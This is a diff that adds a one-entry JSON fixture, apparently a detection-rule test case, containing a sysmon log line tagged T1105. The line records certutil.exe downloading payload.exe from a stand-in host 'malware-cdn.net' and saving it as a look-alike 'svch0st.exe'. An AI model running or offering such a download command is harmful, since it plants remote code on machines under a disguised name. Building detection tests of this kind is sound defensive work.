@@ -1,0 +1,8 @@
+[
+  {
+    "raw": "2026-09-17 13:15:22 PID:3344 TID:2211 \"C:\\Windows\\System32\\certutil.exe\" -urlcache -split -f http://malware-cdn.net/payload.exe C:\\Users\\public\\svch0st.exe",
+    "source": "sysmon",
+    "technique_id": "T1105",
+    "expected_rules": []
+  }
+]
